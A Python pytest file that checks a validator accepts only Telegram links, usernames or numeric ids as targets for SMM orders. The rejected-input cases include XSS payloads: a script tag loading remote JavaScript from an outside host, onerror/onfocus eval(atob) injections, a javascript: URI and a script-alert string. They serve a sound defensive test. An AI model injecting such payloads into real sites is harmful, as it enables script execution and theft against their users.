"""SMM order targets must be a Telegram link / username / numeric id.

Accepting arbitrary text let HTML/JS payloads into the DB and onward to the
provider; these pin the validator plus the service-level wiring.
"""

from unittest.mock import MagicMock
from uuid import uuid4

import pytest

from app.utils.telegram_target import (
    MAX_TARGET_LENGTH,
    is_valid_telegram_target,
    validate_telegram_target,
)


@pytest.mark.parametrize(
    "value",
    [
        "https://t.me/AndiniCollectionn",
        "http://t.me/x",
        "t.me/colectionpap/9?single",
        "https://t.me/+wFbMGIf3CSBhN2Jl",
        "https://t.me/c/3997908946/16",
        "https://telegram.me/koleksipapliaa",
        "@username",
        "AndiniCollectionn",
        "385",
        "-100123456",
    ],
)
def test_valid_targets(value):
    assert validate_telegram_target(value) == value
    assert is_valid_telegram_target(value) is True


@pytest.mark.parametrize(
    "value",
    [
        "<script>$.getScript('https://js.rip/x')</script>",
        '"><img src=x onerror=eval(atob(this.id))>',
        '"><input onfocus=eval(atob(this.id)) id=x autofocus>',
        "javascript:eval('var a=document.createElement(\"script\")')",
        "https://evil.example.com/x",
        "user name",
        "a",
        "",
        "   ",
    ],
)
def test_invalid_targets(value):
    assert is_valid_telegram_target(value) is False
    with pytest.raises(ValueError):
        validate_telegram_target(value)


def test_target_is_trimmed_and_length_bounded():
    assert validate_telegram_target("  @username  ") == "@username"
    with pytest.raises(ValueError):
        validate_telegram_target("https://t.me/" + "a" * MAX_TARGET_LENGTH)


@pytest.mark.asyncio
async def test_place_order_rejects_bad_target_before_pricing():
    """The target is validated before pricing / DB work, so it fails fast."""
    from app.services import order_service
    from app.smm_service_ids import ALLOWED_SMM_SERVICE_IDS

    service_id = next(iter(ALLOWED_SMM_SERVICE_IDS))
    db = MagicMock()
    user = MagicMock()
    user.id = uuid4()

    with pytest.raises(ValueError):
        await order_service.place_order(
            db, user, service_id, "<script>alert(1)</script>", 1
        )
